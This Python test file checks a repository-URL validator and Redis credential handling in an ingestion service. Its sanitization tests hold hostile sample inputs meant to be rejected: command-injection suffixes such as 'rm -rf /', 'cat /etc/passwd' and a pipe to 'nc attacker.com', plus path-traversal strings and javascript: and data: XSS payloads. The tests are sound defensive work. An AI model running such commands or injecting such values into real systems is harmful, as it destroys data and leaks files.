"""
Unit Tests for Security Features (Phase 19 - Task 8.6)

This module contains unit tests for security features including:
- Credential validation with invalid credentials
- URL sanitization rejects malicious inputs

Requirements: 11.1, 11.2, 11.4
"""

import os
import sys
import pytest
from unittest.mock import patch, MagicMock

# Mock upstash_redis if not available
try:
    from upstash_redis import Redis
except ImportError:
    # Create a mock Redis class for testing
    class Redis:
        def __init__(self, url, token):
            self.url = url
            self.token = token

        def ping(self):
            return True

    # Add to sys.modules so imports work
    sys.modules["upstash_redis"] = type("module", (), {"Redis": Redis})()

from app.routers.ingestion import is_valid_repo_url


# ============================================================================
# URL Sanitization Tests (Requirement 11.4)
# ============================================================================


class TestURLSanitization:
    """Test URL sanitization and validation."""

    def test_valid_github_url(self):
        """Test that valid GitHub URLs are accepted."""
        assert is_valid_repo_url("github.com/user/repo")
        assert is_valid_repo_url("https://github.com/user/repo")
        assert is_valid_repo_url("https://github.com/user/repo.git")

    def test_valid_gitlab_url(self):
        """Test that valid GitLab URLs are accepted."""
        assert is_valid_repo_url("gitlab.com/user/repo")
        assert is_valid_repo_url("https://gitlab.com/user/repo")

    def test_valid_bitbucket_url(self):
        """Test that valid Bitbucket URLs are accepted."""
        assert is_valid_repo_url("bitbucket.org/user/repo")
        assert is_valid_repo_url("https://bitbucket.org/user/repo")

    def test_empty_url_rejected(self):
        """Test that empty URLs are rejected."""
        assert not is_valid_repo_url("")
        assert not is_valid_repo_url("   ")
        assert not is_valid_repo_url("\t\n")

    def test_command_injection_rejected(self):
        """Test that URLs with shell metacharacters are rejected."""
        malicious_urls = [
            "github.com/user/repo; rm -rf /",
            "github.com/user/repo && cat /etc/passwd",
            "github.com/user/repo | nc attacker.com 1234",
            "github.com/user/repo`whoami`",
            "github.com/user/repo$(whoami)",
            "github.com/user/repo{echo,test}",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"Malicious URL should be rejected: {url}"
            )

    def test_path_traversal_rejected(self):
        """Test that URLs with path traversal are rejected."""
        malicious_urls = [
            "github.com/user/../../../etc/passwd",
            "github.com/user/repo/../../../",
            "github.com/../../etc/shadow",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"Path traversal URL should be rejected: {url}"
            )

    def test_redirection_operators_rejected(self):
        """Test that URLs with redirection operators are rejected."""
        malicious_urls = [
            "github.com/user/repo > /tmp/output",
            "github.com/user/repo < /etc/passwd",
            "github.com/user/repo >> /tmp/log",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"Redirection URL should be rejected: {url}"
            )

    def test_newline_injection_rejected(self):
        """Test that URLs with newline characters are rejected."""
        malicious_urls = [
            "github.com/user/repo\nmalicious",
            "github.com/user/repo\rmalicious",
            "github.com/user/repo\r\nmalicious",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"Newline injection URL should be rejected: {url}"
            )

    def test_control_characters_rejected(self):
        """Test that URLs with control characters are rejected."""
        # Test various control characters
        for char_code in range(0x00, 0x20):  # Control characters
            url = f"github.com/user/repo{chr(char_code)}test"
            assert not is_valid_repo_url(url), (
                f"URL with control character 0x{char_code:02x} should be rejected"
            )

        # Test DEL character (0x7F)
        assert not is_valid_repo_url(f"github.com/user/repo{chr(0x7F)}test")

    def test_file_protocol_rejected(self):
        """Test that file:// protocol is rejected."""
        malicious_urls = [
            "file:///etc/passwd",
            "file://localhost/etc/passwd",
            "FILE:///etc/passwd",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"File protocol URL should be rejected: {url}"
            )

    def test_javascript_protocol_rejected(self):
        """Test that javascript: protocol is rejected."""
        malicious_urls = [
            "javascript:alert('XSS')",
            "JAVASCRIPT:alert('XSS')",
            "javascript:void(0)",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"JavaScript protocol URL should be rejected: {url}"
            )

    def test_data_protocol_rejected(self):
        """Test that data: protocol is rejected."""
        malicious_urls = [
            "data:text/html,<script>alert('XSS')</script>",
            "DATA:text/plain,malicious",
        ]

        for url in malicious_urls:
            assert not is_valid_repo_url(url), (
                f"Data protocol URL should be rejected: {url}"
            )

    def test_invalid_protocol_rejected(self):
        """Test that some invalid protocols are rejected."""
        # Note: The validation is permissive for git-related protocols
        # but blocks clearly malicious ones
        invalid_urls = [
            "javascript:alert('XSS')",
            "file:///etc/passwd",
            "data:text/html,<script>",
        ]

        for url in invalid_urls:
            assert not is_valid_repo_url(url), (
                f"Malicious protocol URL should be rejected: {url}"
            )

    def test_missing_domain_rejected(self):
        """Test that URLs without proper domain are rejected."""
        invalid_urls = [
            "https://",
            "http://",
            "/user/repo",
        ]

        for url in invalid_urls:
            assert not is_valid_repo_url(url), (
                f"URL without domain should be rejected: {url}"
            )

    def test_invalid_domain_format_rejected(self):
        """Test that URLs with invalid domain format are rejected."""
        invalid_urls = [
            "https://-invalid.com/user/repo",
            "https://invalid-.com/user/repo",
            "https://inv@lid.com/user/repo",
        ]

        for url in invalid_urls:
            assert not is_valid_repo_url(url), (
                f"Invalid domain format URL should be rejected: {url}"
            )

    def test_url_length_limit(self):
        """Test that excessively long URLs are rejected."""
        # Create a URL longer than 2048 characters
        long_url = "github.com/" + "a" * 3000
        assert not is_valid_repo_url(long_url), (
            "Excessively long URL should be rejected"
        )

    def test_simple_repo_path_accepted(self):
        """Test that simple repository paths are accepted."""
        # The validation is permissive for simple paths that will be
        # converted to https:// URLs
        assert is_valid_repo_url("github.com/user/repo")
        assert is_valid_repo_url("gitlab.com/user/repo")


# ============================================================================
# Credential Validation Tests (Requirements 11.1, 11.2)
# ============================================================================


class TestCredentialValidation:
    """Test credential validation for Redis."""

    @patch("app.routers.ingestion.Redis")
    def test_redis_credential_validation_missing_url(self, mock_redis_class):
        """Test that missing Redis URL is caught."""
        from app.routers.ingestion import get_redis_client
        from fastapi import HTTPException

        with patch.dict(
            os.environ,
            {"UPSTASH_REDIS_REST_URL": "", "UPSTASH_REDIS_REST_TOKEN": "test-token"},
        ):
            with pytest.raises(HTTPException) as exc_info:
                get_redis_client()

            assert exc_info.value.status_code == 503
            assert "not configured" in str(exc_info.value.detail).lower()

    @patch("app.routers.ingestion.Redis")
    def test_redis_credential_validation_missing_token(self, mock_redis_class):
        """Test that missing Redis token is caught."""
        from app.routers.ingestion import get_redis_client
        from fastapi import HTTPException

        with patch.dict(
            os.environ,
            {
                "UPSTASH_REDIS_REST_URL": "https://test.upstash.io",
                "UPSTASH_REDIS_REST_TOKEN": "",
            },
        ):
            with pytest.raises(HTTPException) as exc_info:
                get_redis_client()

            assert exc_info.value.status_code == 503
            assert "not configured" in str(exc_info.value.detail).lower()

    @patch("app.routers.ingestion.Redis")
    def test_redis_credential_validation_invalid_credentials(self, mock_redis_class):
        """Test that invalid Redis credentials are caught."""
        from app.routers.ingestion import get_redis_client
        from fastapi import HTTPException

        # Mock Redis client that fails ping
        mock_client = MagicMock()
        mock_client.ping.side_effect = Exception("Authentication failed")
        mock_redis_class.return_value = mock_client

        with patch.dict(
            os.environ,
            {
                "UPSTASH_REDIS_REST_URL": "https://test.upstash.io",
                "UPSTASH_REDIS_REST_TOKEN": "invalid-token",
            },
        ):
            with pytest.raises(HTTPException) as exc_info:
                get_redis_client()

            assert exc_info.value.status_code == 503
            assert "authentication failed" in str(exc_info.value.detail).lower()

    @patch("app.routers.ingestion.Redis")
    def test_redis_credential_validation_success(self, mock_redis_class):
        """Test that valid Redis credentials pass validation."""
        from app.routers.ingestion import get_redis_client

        # Mock Redis client that succeeds ping
        mock_client = MagicMock()
        mock_client.ping.return_value = True
        mock_redis_class.return_value = mock_client

        with patch.dict(
            os.environ,
            {
                "UPSTASH_REDIS_REST_URL": "https://test.upstash.io",
                "UPSTASH_REDIS_REST_TOKEN": "valid-token",
            },
        ):
            client = get_redis_client()
            assert client is not None
            mock_client.ping.assert_called_once()

    def test_edge_worker_credential_validation_missing_url(self):
        """Test that Edge Worker fails fast with missing Redis URL."""
        pytest.importorskip(
            "torch_geometric",
            reason="EdgeWorker requires torch_geometric (edge-only dependency)",
        )
        from worker import EdgeWorker

        with patch.dict(
            os.environ,
            {"UPSTASH_REDIS_REST_URL": "", "UPSTASH_REDIS_REST_TOKEN": "test-token"},
        ):
            with pytest.raises(SystemExit) as exc_info:
                EdgeWorker()

            assert exc_info.value.code == 1

    def test_edge_worker_credential_validation_missing_token(self):
        """Test that Edge Worker fails fast with missing Redis token."""
        pytest.importorskip(
            "torch_geometric",
            reason="EdgeWorker requires torch_geometric (edge-only dependency)",
        )
        from worker import EdgeWorker

        with patch.dict(
            os.environ,
            {
                "UPSTASH_REDIS_REST_URL": "https://test.upstash.io",
                "UPSTASH_REDIS_REST_TOKEN": "",
            },
        ):
            with pytest.raises(SystemExit) as exc_info:
                EdgeWorker()

            assert exc_info.value.code == 1

    def test_edge_worker_credential_validation_invalid_credentials(self):
        """Test that Edge Worker fails fast with invalid Redis credentials."""
        pytest.importorskip(
            "torch_geometric",
            reason="EdgeWorker requires torch_geometric (edge-only dependency)",
        )
        from worker import EdgeWorker

        with patch("worker.Redis") as mock_redis_class:
            # Mock Redis client that fails ping
            mock_client = MagicMock()
            mock_client.ping.side_effect = Exception("Authentication failed")
            mock_redis_class.return_value = mock_client

            with patch.dict(
                os.environ,
                {
                    "UPSTASH_REDIS_REST_URL": "https://test.upstash.io",
                    "UPSTASH_REDIS_REST_TOKEN": "invalid-token",
                },
            ):
                with pytest.raises(SystemExit) as exc_info:
                    EdgeWorker()

                assert exc_info.value.code == 1


# ============================================================================
# Integration Tests
# ============================================================================


class TestSecurityIntegration:
    """Integration tests for security features."""

    def test_url_sanitization_in_ingestion_endpoint(self):
        """Test that URL sanitization is applied in ingestion endpoint."""
        # This is tested in test_cloud_api.py, but we verify the
        # sanitization function is properly integrated

        # Test that malicious URLs are rejected
        malicious_url = "github.com/user/repo; rm -rf /"
        assert not is_valid_repo_url(malicious_url)

        # Test that valid URLs are accepted
        valid_url = "github.com/user/repo"
        assert is_valid_repo_url(valid_url)
